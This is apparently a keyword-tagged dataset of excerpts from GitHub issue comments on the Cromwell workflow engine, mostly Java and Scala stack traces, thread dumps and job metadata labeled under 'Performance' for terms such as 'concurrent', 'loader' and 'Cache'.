org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$4(WorkflowFailSlowSpec.scala:30); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at c,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030:5669,concurren,concurrent,5669,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030,1,['concurren'],['concurrent']
Performance,cePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234); 	at java.util.stream.ReferencePipeline.findFirst(ReferencePipeline.java:464); 	at software.amazon.awssdk.core.internal.http.loader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:22); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.build(SdkDefaultClientBuilder.java:119); 	,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:7361,load,loader,7361,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['load'],['loader']
Performance,ception(HikariPool.java:548); 	at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:186); 	at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:145); 	at com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:83); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource.createConnection(HikariCPJdbcDataSource.scala:18); 	at slick.jdbc.JdbcBackend$BaseSession.<init>(JdbcBackend.scala:439); 	at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:47); 	at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:38); 	at slick.basic.BasicBackend$DatabaseDef.acquireSession(BasicBackend.scala:218); 	at slick.basic.BasicBackend$DatabaseDef.acquireSession$(BasicBackend.scala:217); 	at slick.jdbc.JdbcBackend$DatabaseDef.acquireSession(JdbcBackend.scala:38); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:239); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); 	at java.lang.Thread.run(Thread.java:745); Caused by: com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failure. The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.; 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:422); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.SQLError.createCommunicationsException(SQLError.java:989); 	at com.mysql.jdbc.MysqlIO.<init>(MysqlIO.java:341); 	at com.mysql.jdbc.ConnectionImpl.coreConnect(ConnectionImpl.java:2192); 	at com.mysql.jdbc.ConnectionImpl.connectOneTryOnly(Con,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:3705,concurren,concurrent,3705,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,1,['concurren'],['concurrent']
Performance,ception: Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:5948,concurren,concurrent,5948,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['concurren'],['concurrent']
Performance,"ceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection.immutable.List.map(List.scala:283); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$1(HealthMonitorServiceActorSpec.scala:40); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventually(HealthMonitorServiceActorSpec.scala:20); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventualStatus(HealthMonitorServiceActorSpec.scala:32); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$new$5(HealthMonitorServiceActorSpec.scala:81); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.services.healthmoni",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:6834,concurren,concurrent,6834,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
Performance,cf: `WorkflowManagerActor`:. ```; [190] jobStoreActor ! RegisterWorkflowCompleted(workflowId); ...; [196] workflowStore ! WorkflowStoreActor.RemoveWorkflow(workflowId); ```. Ideally these would be performed in order rather than simultaneously.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1247#issuecomment-253933381:197,perform,performed,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1247#issuecomment-253933381,1,['perform'],['performed']
Performance,"cket"": ""gs://broad-dsde-methods/cromwell-execution-30"",; ""zone"": ""us-east1-d"",; ""instanceName"": ""ggp-10276417784841300252""; },; ""outputs"": {; ""outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort/md.sorted.bam""; },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 1 LOCAL"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1"",; ""cpu"": ""4"",; ""noAddress"": ""false"",; ""zones"": ""us-central1-a,us-central1-b,us-east1-d,us-central1-c,us-central1-f,us-east1-c"",; ""memory"": ""16 GB""; },; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""hashes"": {; ""output count"": ""C4CA4238A0B923820DCC509A6F75849B"",; ""runtime attribute"": {; ""docker"": ""727DC68A78243A55A510496DBD51C8FD"",; ""continueOnReturnCode"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327""; },; ""output expression"": {; ""File outBam"": ""51E81723BF4AE3737FA7A05AD3C404E0""; },; ""input count"": ""A87FF679A2F3E71D9181A67B7542122C"",; ""backend name"": ""5BAA79C7C5A573C899A61D342AA00484"",; ""command template"": ""7F303905B5A7C3C5E133EEA5D655F93F"",; ""input"": {; ""String docker"": ""5FFD9AB91DECDD52945847CAED219F0A"",; ""String outputName"": ""A3830295D56B220883B7627EB49D6ECD"",; ""String sortOrder"": ""33D645FB17F6C04818DAB3100252CF39"",; ""File bam"": ""v+At8g==""; }; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache""; },; ""inputs"": {; ""outputName"": ""md.sorted"",; ""bam"": ""gs://broad-public-datasets/NA12878/NA12878.hg38.aligned.unsorted.duplicates_marked.bam"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1"",; ""sortOrder"": ""queryname""; },; ""backendLabels"": {; ""wdl-task-name"": ""sortsam"",; ""wdl-call-alias"": ""presort"",; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e""; },; ""returnCode"": 0,; ""labels"": {; ""wdl-call-alias"": ""PreSort"",; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e"",; ""wdl-tas",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328:6841,Cache,Cache,6841,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328,1,['Cache'],['Cache']
Performance,class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:6084,concurren,concurrent,6084,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['concurren'],['concurrent']
Performance,"concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; ```; $ tail -n 10 stderr; Traceback (most recent call last):; File ""/src/Merge_MAFs.py"", line 182, in <module>; main(sys.argv[1:]); File ""/src/Merge_MAFs.py"", line 76, in main; concatenatedMafFilename = _handle_mafs(args); File ""/src/Merge_MAFs.py"", line 83, in _handle_mafs; mafPaths = _getMafPaths(args.mafpaths); File ""/src/Merge_MAFs.py"", line 98, in _getMafPaths; raise Exception(""MAF doesn't exist: %s"" % mafPath); Exception: MAF doesn't exist: /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/cromwell-executions/aggregate_mafs_workflow/814c47aa-9d11-4c81-a08c-f2b77c002b46/call-aggregate_mafs/inputs/Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/tests/TCGA-OR-A5J1-01A-11D-A29I-10.ff872fc4-bd1c-4975-85c8-3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:6943,concurren,concurrent,6943,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['concurren'],['concurrent']
Performance,"concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007f",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2739,concurren,concurrent,2739,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1862,concurren,concurrent,1862,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"conds rather than 10. The error gets repeated a number of times (in the latest log it appears 9 times). The output in question is a glob and there are 80 calls to the task producing it. 2 fastqs get chucked into 20 chunks each, so 40 total. FastQC is run for these chunks once before adapter clipping and once after, so 80 total. There's a bunch of other jobs being run as well, but I'm only seeing this error for this specifc output (`Fastqc.images`). ```; [2018-10-11 13:48:43,66] [error] WorkflowManagerActor Workflow 0a20b0d2-8ad2-43b1-ba92-49e1c39d6578 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'Fastqc.images': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.disp",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379:1111,concurren,concurrent,1111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379,1,['concurren'],['concurrent']
Performance,"config.file is loaded, but . > workflow-options {; > workflow-failure-mode: ""ContinueWhilePossible""; > }. does not work",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1380#issuecomment-245645479:15,load,loaded,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1380#issuecomment-245645479,1,['load'],['loaded']
Performance,"config/ConfigAsyncJobExecutionActor.scala; which was tweaked since the last release in a change from @cjllanwarne (https://github.com/broadinstitute/cromwell/commit/33c58ef22b6a8edc4c1912c1416225c79d298f76#diff-39fe7186c2383fc1135f29a9c05e4e57) but I don't; grasp the scope of the change enough to know if this triggers it. In our CWL run, the jobs get submitted to the cluster and run okay based on the; work directories in `cromwell-execution` but the polling dies with:; ```; [2019-01-17 12:34:15,18] [info] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobEx",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:1323,concurren,concurrent,1323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['concurren'],['concurrent']
Performance,"contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection.immutable.List.map(List.scala:283); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$1(HealthMonitorServiceActorSpec.scala:40); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventually(HealthMonitorServiceActorSpec.scala:20); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventualStatus(HealthMonitorServiceActorSpec.scala:32); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$new$5(HealthMonitorServiceActorSpec.scala:81); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at 